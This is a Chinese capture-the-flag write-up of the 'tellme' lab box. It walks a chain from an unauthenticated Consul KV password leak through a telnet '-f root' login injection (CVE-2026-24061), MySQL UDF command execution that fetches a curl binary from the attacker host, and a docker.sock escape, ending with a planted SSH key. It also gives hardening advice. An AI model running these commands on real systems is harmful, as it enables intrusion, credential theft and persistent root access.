# tellme 靶机复盘：Consul 口令、Telnet 绕过到 Docker 逃逸

> 本文记录的是隔离环境中的授权靶机复盘。认证绕过、数据库 UDF 与容器逃逸验证均不可用于未授权系统。

| 项目 | 本次记录 |
|------|----------|
| 靶机 | tellme（多容器 compose，项目名约 `tell`） |
| 目标地址 | 192.168.134.72 |
| 开放端口 | 22/tcp、80/tcp、2323/tcp（telnet）、8500/tcp（Consul） |
| user flag | `e34a4e9c52fdcf32cc9255cfa6d4087a`（`entry_node` 上 `/mnt/user.txt`） |
| root flag | `473392cd7b2b5ecb49f0f88b61d2ce7e`（宿主机，藏在 MySQL 海豚 ASCII art 里） |
| 最终路径 | Consul KV → Telnet CVE-2026-24061 → 内网 fscan → MySQL UDF → `docker.sock` 逃逸 → 宿主机 root |

![环境启动](/content/tellme/image-01.webp)
![主机发现](/content/tellme/image-02.webp)

## 1. 攻击链概览

对外只看到一台 `192.168.134.72`，实际是多容器叠出来的内网：入口 telnet、Consul、MySQL 分属不同节点，宿主机还挂着 Apache 和 SSH。主线分三段——

1. **情报**：Consul 未授权 KV 给出 MySQL root 密码  
2. **立足**：Telnet 自动登录用户名注入，进 `entry_node` 容器 root，拿 user flag  
3. **收网**：内网扫到 `db_node`，用回收的口令 + 现成 UDF 拿到 `docker_host` 身份，借 `docker.sock` 挂载宿主机根目录，读 root flag 并写 SSH 公钥  

```text
nmap：22 / 80 / 2323 / 8500
  → Consul /v1/kv：mysql/config/root_pass → TellMeYouLoveMe
  → USER='-f root' telnet -a 192.168.134.72 2323（CVE-2026-24061）
  → entry_node root；/mnt/user.txt
  → 上传 frp / fscan；扫 172.20.0.0/24
  → 转发 172.20.0.30:3306 → 本机 13306
  → mysql root + TellMeYouLoveMe；sys_eval 已存在
  → mysql ∈ docker_host，可连 /var/run/docker.sock
  → 反弹 shell → Docker API 拉逃逸容器（Binds: /:/host）
  → cat /host/root/root.txt；写 /host/root/.ssh/authorized_keys
  → ssh -i key root@192.168.134.72 → 宿主机 Tellme
```

事后对照 compose / 容器名，拓扑大致是：

| 节点 | 角色 | 内网 IP | 对外映射 |
|------|------|---------|----------|
| 宿主机 `Tellme` | Apache :80、SSH :22、Docker 守护进程 | 网关 `172.20.0.1` | 22、80 |
| `entry_node` | telnet 入口（Ubuntu minimized） | `172.20.0.10` | 2323→23 |
| `consul_node` | HashiCorp Consul 1.15.10 | `172.20.0.20` | 8500 |
| `db_node` | MySQL 5.7.44（Oracle Linux 系） | `172.20.0.30` | 无直接映射，经内网 / 转发访问 |

user flag 在入口容器，root flag 在宿主机——中间必须完成一次真正的容器逃逸。

## 2. 信息收集：四个端口

```bash
nmap -sT -sV -sC -O -p- 192.168.134.72
```

| 端口 | 服务 | 版本 / 指纹 | 备注 |
|------|------|-------------|------|
| 22/tcp | ssh | OpenSSH 10.0 | 宿主机 SSH |
| 80/tcp | http | Apache 2.4.66 (Unix) | 标题 `It works!`，默认页，基本无入口 |
| 2323/tcp | telnet | 协商指纹含 AUTH | 后面是 `entry_node` |
| 8500/tcp | http | Golang `net/http` | 标题 *Consul by HashiCorp*，API 要求 path 以 `/v1/` 开头；根路径 301 到 `/ui/` |

80 先放着。真正有戏的是 **8500（情报）** 和 **2323（入口）**。

## 3. Consul：未授权 KV 与死路 RCE

### 3.1 读 KV 拿密码

8500 上的 Consul agent API 可直接访问（ACL 未真正卡住匿名读）。UI 或 API 都能看到数据库相关键：

![Consul KV 泄露](/content/tellme/image-03.webp)

```bash
curl -s "http://192.168.134.72:8500/v1/kv/?recurse"
# 关键：mysql/config/root_pass → Value 为 Base64
# VGVsbE1lWW91TG92ZU1l  →  TellMeYouLoveMe
```

这串对应 compose 里的 `MYSQL_ROOT_PASSWORD`，后面连 `db_node` 直接复用。

也可顺手确认 agent 配置：

```bash
curl -s http://192.168.134.72:8500/v1/agent/self
# ACLsEnabled / DefaultPolicy 一类字段：生产上不该对公网默认放行
```

### 3.2 script check RCE 走不通

经典「注册带 `Args` 的恶意 health check → Consul 帮你执行」在这台上被拒：远程 script check 关闭（`enable_script_checks` / `enable_local_script_checks` 一类开关未开）。返回类似 *Scripts are disabled on this agent from remote calls*。  
所以 Consul 在本靶机里主要是 **KV 凭据源**，不是 RCE 入口。

### 3.3 HTTP check 只能当弱 SSRF

注册 HTTP 类型 check，让 agent 去请求内网地址，再从 `/v1/agent/checks` 的 `Output` 回读状态——能确认网关 / Apache 等存活，但吃不到更深的东西。情报阶段到密码为止就够了。

## 4. 入口：Telnet `login -f` 注入（CVE-2026-24061）

### 4.1 原理

2323 上的 telnetd 走自动登录协商时，把客户端上报的**用户名字符串原样**交给 `login`。

- `login -f <user>` 的语义是：「已通过认证，直接以该用户登录」  
- 若把用户名设成 `-f root`，就会变成对 `login` 注入参数，**免密进 root**  

这是经典 telnetd / login 组合缺陷的再次现身；公开跟踪为 **CVE-2026-24061**。  
参考：[SafeBreach-Labs/CVE-2026-24061](https://github.com/SafeBreach-Labs/CVE-2026-24061)

GNU inetutils 的 `telnet` 本身没有方便的 `-f`，但 `-a`（自动登录）会读取环境变量 `$USER` 作为上报用户名，所以一行就能打：

```bash
USER='-f root' telnet -a 192.168.134.72 2323
```

### 4.2 落地

![Telnet 进 entry_node](/content/tellme/image-04.webp)

```text
Linux 6.12.59-0-lts (entry_node) (pts/0)
Welcome to Ubuntu 24.04.3 LTS ...
root@entry_node:~# id
uid=0(root) gid=0(root) groups=0(root)
root@entry_node:~# cat /root/goodjob
First flag unlocked, find it!
root@entry_node:~# find / -name "user.txt" 2>/dev/null
/mnt/user.txt
root@entry_node:~# cat /mnt/user.txt
e34a4e9c52fdcf32cc9255cfa6d4087a
```

拿到 **user flag**。hostname 是 `entry_node`，系统还是 minimized Ubuntu——没 `curl` / `mysql` 客户端之类很正常。  
这里是**入口容器的 root**，不是宿主机；后面还要横向到 `db_node` 再逃逸。

## 5. 内网：上工具、fscan、回收密码

### 5.1 frp / fscan

入口容器工具链极简，枚举和提权要靠「神奇妙妙工具」：把 **frp**（把内网端口转到 Kali）和 **fscan** 传上去。

![上传工具](/content/tellme/image-05.webp)

### 5.2 扫 `172.20.0.0/24`

```bash
/tmp/fscan -h 172.20.0.0/24 -p 22,23,80,2323,3306,5432,6379,8500,8502,8503,8600 -gt 60
```

关键结果可以压成一张表：

| 地址 | 开放 | 说明 |
|------|------|------|
| 172.20.0.1 | 22、80、2323、8500… | 宿主机网关；Apache / SSH / 映射进来的 telnet·Consul |
| 172.20.0.10 | 23/telnet | `entry_node` 自身 |
| 172.20.0.20 | 8500 Consul 等 | `consul_node`（标题 Consul by HashiCorp / 1.15.10） |
| 172.20.0.30 | 3306 MySQL 5.7.44 | `db_node` |

fscan 还会再次打出 CVE-2026-24061（`.10:23`、`.1:2323`），和入口一致。  
对 `.30:3306` 的弱口令字典没命中没关系——密码已经在 Consul 里了，不靠喷。

### 5.3 端口转发连 MySQL

经 frp（或等价转发）把 `172.20.0.30:3306` 映到 Kali 的 `13306`，在本机用官方客户端登录：

```bash
mysql -h 127.0.0.1 -P 13306 -u root -pTellMeYouLoveMe
```

```text
Server version: 5.7.44 MySQL Community Server (GPL)
```

## 6. MySQL：权限、UDF、docker_host

### 6.1 先看能不能写、能不能加载插件

```sql
SELECT @@version, @@secure_file_priv, @@plugin_dir;
SHOW GRANTS FOR root;
```

| 项 | 本次观察到的情况 |
|----|------------------|
| `@@version` | 5.7.44 |
| `@@secure_file_priv` | 空 → 文件读写限制很松 |
| `@@plugin_dir` | `/usr/lib64/mysql/plugin/` |
| `root@%` | `GRANT ALL PRIVILEGES ON *.* … WITH GRANT OPTION` |

compose 侧通常还会故意把 plugin 目录放宽、把 `mysql` 用户塞进宿主机相关的 `docker_host` 组——后面 `sys_eval` 的输出会验证这一点。

### 6.2 现成 UDF：`sys_eval`

靶机上 `udf.so` / `sys_eval` 已经就位。再执行：

```sql
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.so';
-- ERROR 1125: Function 'sys_eval' already exists
```

直接用：

```sql
SELECT md5(load_file('/usr/lib64/mysql/plugin/udf.so'));
-- ab27f6c7634e9efc13fb2db29216a0a8

SELECT sys_eval('id; ls -la /var/run/docker.sock') AS cmd_output;
```

```text
uid=999(mysql) gid=999(mysql) groups=999(mysql),103(docker_host)
srw-rw---- 1 root docker_host 0 ... /var/run/docker.sock
```

两句就定调：

1. **命令执行身份是 mysql，但组里有 `docker_host`**  
2. **`/var/run/docker.sock` 对 `docker_host` 可读写**（ro 挂载挡不住 unix socket 的 `connect`）

UDF 本身只是跳板；真正通向宿主机的是 sock。

### 6.3 补齐 curl

`db_node` 里工具很少。可以用 `sys_eval` 调 python2，从攻击机 HTTP 服务拉一个静态 `curl`，方便后面对 Docker API 发请求：

```sql
SELECT sys_eval('python2 -c "import urllib;urllib.urlretrieve(\'http://192.168.134.4:8000/replay/curl\', \'/tmp/curl\')" && chmod +x /tmp/curl && /tmp/curl --version');
```

确认 `/tmp/curl` 可用后，再进交互 shell 会舒服很多。

## 7. 反弹 Shell，再打 Docker API

### 7.1 先到交互的 mysql shell

长 SQL 里塞整段逃逸逻辑不好排错，先反弹到 Kali：

![mysql 反弹](/content/tellme/image-06.webp)

```text
uid=999(mysql) gid=999(mysql) groups=999(mysql),103(docker_host)
```

### 7.2 逃逸思路

对 unix socket 发 Docker Engine HTTP API，核心三步：

1. **`POST /containers/create`**：镜像复用本地已有的（如 `mysql:5.7`），`HostConfig.Binds` 设为 `["/:/host"]`，命令里 `cat /host/root/root.txt` 或写公钥  
2. **`POST /containers/{id}/start`**：拉起容器  
3. **`GET /containers/{id}/logs`**（或等价方式）读输出；持久化则写 `/host/root/.ssh/authorized_keys`  

注意：`Binds` 必须放在 **`HostConfig` 内**，写在 JSON 顶层会被静默忽略，容器起来了也挂不上宿主机根目录。

### 7.3 exec 与 start 的分工

以 mysql 身份直接调部分 API 时，可能出现 **create / inspect / exec 正常，start 却异常** 的情况。稳妥做法是：

1. 先 `POST /containers/db_node/exec` + `POST /exec/{id}/start`，在 **本容器内以 root** 跑脚本（exec 默认常是容器 root）  
2. 再由这段 root 上下文去 `create` / `start` 那个挂载了 `/:/host` 的逃逸容器  

用户侧脚本（如 `escape3.sh` / `final.sh`）做的就是这件事：拉工具 → 调 sock → 挂载宿主机 → 读 flag / 写密钥。

### 7.4 收割

![写公钥 / 宿主机 root](/content/tellme/image-07.webp)

逃逸容器内：

```bash
cat /host/root/root.txt
# 473392cd7b2b5ecb49f0f88b61d2ce7e
# （内容包在 MySQL 海豚 ASCII art 里）

mkdir -p /host/root/.ssh
echo 'ssh-ed25519 AAAA... tellme-pwn' >> /host/root/.ssh/authorized_keys
chmod 600 /host/root/.ssh/authorized_keys
```

Kali 上验证：

```bash
ssh -i ~/.ssh/tellme_key root@192.168.134.72
# hostname → Tellme
# id → uid=0(root) ... 且能看到 docker 相关组
```

宿主机 root 到手，整条链结束。临时逃逸容器用完应删掉，三个业务容器保持原样即可。

## 8. 设计埋点对照

| 设计者埋的点 | 对应攻击动作 |
|--------------|--------------|
| Consul API 弱 ACL / 可匿名读 KV | 读到 `mysql/config/root_pass` |
| 密码进 KV（`MYSQL_ROOT_PASSWORD`） | 内网 MySQL 直接复用，不必喷口令 |
| `entry_node` telnetd + `login -f` 未过滤 | `USER='-f root' telnet -a` 免密容器 root |
| `secure_file_priv=""`、plugin 目录过宽 | UDF / `load_file` 路线畅通 |
| `mysql` 加入 `docker_host` | 进程级具备碰 sock 的身份 |
| `docker.sock` 挂进 `db_node`（即便 ro） | unix connect → Docker API → 挂载宿主机 `/` |

任意一环收紧（KV 禁匿名、废 telnet、收紧 plugin、禁止 sock 进容器）都能打断这条链。

## 9. 关键知识点

| 要点 | 复盘结论 |
|------|----------|
| 多容器靶机 | 先分清「容器 root」和「宿主机 root」；user / root flag 可能不在同一层 |
| Consul | 未授权 KV 比死磕 script RCE 更常直接出凭据；script check 关掉就换路 |
| CVE-2026-24061 | 自动登录用户名 → `login -f`；inetutils 用 `$USER` + `telnet -a` 即可 |
| 内网扫描 | 入口 minimized 时工具；frp 转发 + fscan 比在容器里硬写协议快 |
| MySQL UDF | `sys_eval` 只解决「容器内命令执行」；看 `id` 输出里的**附加组** |
| docker.sock | 组权限 + sock 可读可连 ≈ 宿主机 root；`HostConfig.Binds: /:/host` 是标准挂载逃逸 |
| API 细节 | exec 拿容器 root、再 start 逃逸容器，比单身份硬打 start 更稳 |

## 10. 复盘

tellme 把三处「各看还行」的配置串成了完整入侵：Consul 负责送密码，Telnet 负责送进内网，MySQL 容器负责把 `docker.sock` 交给 `docker_host`。  

前半段（KV + `-f root` + user flag）很短；真正的工作量在 **内网定位 `db_node`、确认 UDF / 组 / sock、再完整走完 Docker API 逃逸**。抓住一句就够串起来：

**Consul 出账密 → Telnet 进入口容器 → MySQL 出 sock → 挂载 `/` 上宿主机。**
